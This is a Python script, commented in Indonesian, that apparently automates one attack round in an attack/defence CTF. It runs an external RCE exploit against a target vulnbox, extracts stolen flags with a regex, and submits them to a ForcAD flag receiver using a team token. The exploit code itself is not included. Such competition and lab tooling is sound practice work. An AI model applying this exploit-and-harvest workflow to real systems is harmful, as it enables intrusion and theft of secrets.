#!/usr/bin/env python3
"""Fase 2 — orkestrasi serangan end-to-end memakai exploit saarCTF ASLI.

    run_attack.py <ip-target> <token-penyerang> <user1,user2,...>

Alur (ini yang dilakukan tim penyerang tiap ronde di A/D sungguhan):
  1. Jalankan exploit RCE asli (`exploit_iv_rce.py`) terhadap vulnbox target.
     Exploit itu TIDAK diubah — dipanggil sebagai subprocess apa adanya.
  2. Saring flag ForcAD dari keluarannya (regex format flag).
  3. Submit flag curian ke flag receiver ForcAD dengan token tim penyerang.

Catatan fidelitas:
  * Daftar username target di A/D sungguhan datang dari `attack_data` gameserver
    (di saarCTF flag_id memang dipublikasikan). Di sini diberikan sebagai
    argumen; sumbernya bisa diganti ke `/api/client/attack_data/` bila adapter
    di-set `checker_type: pfr`.
  * Exploit dijalankan sebagai subprocess justru supaya jelas TIDAK ada yang
    disentuh di dalamnya — flag yang tersubmit benar-benar hasil RCE, bukan
    dibaca dari database.
"""

import re
import subprocess
import sys

import requests

# Flag ForcAD: 31 karakter [A-Z0-9] diakhiri '='. Untuk Licenser diawali 'L'
# (huruf pertama nama service), tapi regex ini sengaja umum.
FLAG_RE = re.compile(r'[A-Z0-9]{31}=')
RECEIVER = 'http://forcad-nginx-1/flags/'


def main():
    if len(sys.argv) < 4:
        print(f'pemakaian: {sys.argv[0]} <ip> <token> <user1,user2,...>', file=sys.stderr)
        sys.exit(2)

    target, token, users = sys.argv[1], sys.argv[2], sys.argv[3]

    print(f'[*] menjalankan exploit RCE asli terhadap {target} (user: {users})')
    proc = subprocess.run(
        ['python3', 'exploit_iv_rce.py', target, users],
        capture_output=True, text=True, timeout=120,
    )
    out = proc.stdout + proc.stderr
    print('--- keluaran exploit (ekor) ---')
    print('\n'.join(out.splitlines()[-15:]))
    print('-------------------------------')

    flags = sorted(set(FLAG_RE.findall(out)))
    if not flags:
        print('[!] tidak ada flag ditemukan di keluaran exploit', file=sys.stderr)
        sys.exit(1)
    print(f'[+] {len(flags)} flag dicuri via RCE: {flags}')

    resp = requests.put(RECEIVER, headers={'X-Team-Token': token}, json=flags, timeout=15)
    print(f'[*] submit -> HTTP {resp.status_code}')
    print(resp.text[:600])


if __name__ == '__main__':
    main()
